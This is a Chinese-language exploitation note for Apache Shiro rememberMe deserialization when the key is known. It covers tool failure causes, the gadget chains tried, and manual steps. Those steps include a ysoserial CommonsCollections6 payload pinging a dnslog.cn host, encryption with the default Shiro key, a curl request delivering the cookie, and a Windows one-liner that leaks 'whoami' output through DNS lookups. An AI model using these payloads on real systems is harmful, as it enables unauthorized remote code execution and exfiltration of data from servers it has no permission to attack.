shiro利用链

一、情况

有key无链怎么打

二、工具

1、原因分析

工具判断依据是存在deleteMe字段就认为失败，实际上 deleteMe 在以下三种情况下都会出现：

  1. key 错 / AES 模式不符；
  2. 解密成功但反序列化抛异常（类不存在）；
  3. 解密+反序列化全成功、gadget 已执行，但结果不是 PrincipalCollection → 强转失败。

三种回显方式原理：payload 运行时反射拿到当前请求的 Response 对象，把命令输出直接写回这次 HTTP 响应。

  1. SpringEcho：需要 Spring Web 的 RequestContextHolder
  2. TomcatEcho：依赖特定 Tomcat 版本的 ResponseFacade/Response 可达性
  3. AllEcho：

已尝试链路：

CommonsBeanutils* → 需要 commons-beanutils → 目标没有

CommonsCollections2 → 需要 commons-collections4 → 目标没有

未尝试链路：

CC1 / CC5 / CC6 / CC7 / Spring1 / Spring2

总结：工具构建的链路尚不全面。

三、手工

1、dnslog

  1. 生成序列化 payload：
    java -jar ysoserial-all.jar CommonsCollections6 "ping -n 1 kvo3ll.dnslog.cn" > p.bin
  2. 用 Shiro 默认 key 做 AES-CBC 加密（随机 16 字节 IV 前置、PKCS5 填充），再 Base64：
    java ShiroEnc "kPH+bIxk5D2deZiIxcaaaA==" p.bin
  3. 发送：curl http://XXXX/ -H "Cookie: rememberMe=<cookie>"
  4. 观察 DNSLog 回连。
    • ⚠️ 注意：用 nslookup 做回连可能会静默失败；使用 ping 或其它可用命令。

CC6 是 CC 系里用得最多、最稳的一条（HashSet + TiedMapEntry + LazyMap，触发器全是 JDK 类，不依赖 AnnotationInvocationHandler）

2、命令执行

片段 作用
cmd /c 用 Windows 命令解释器执行后面这串（因为 Java 的 Runtime.exec 不会经过 shell，而 for 是 cmd 内建命令，必须先叫 cmd）
for /f … in (‘whoami’) 运行 whoami，取它的每一行输出
“tokens=1,2 delims=" 选项：以反斜杠切分，取第 1、2 段
%i / %j 两个变量：%i=第1段、%j=第2段
do ping -n 1 mach-%i-user-%j.<域> 把两段拼成一个 DNS 名字去 ping
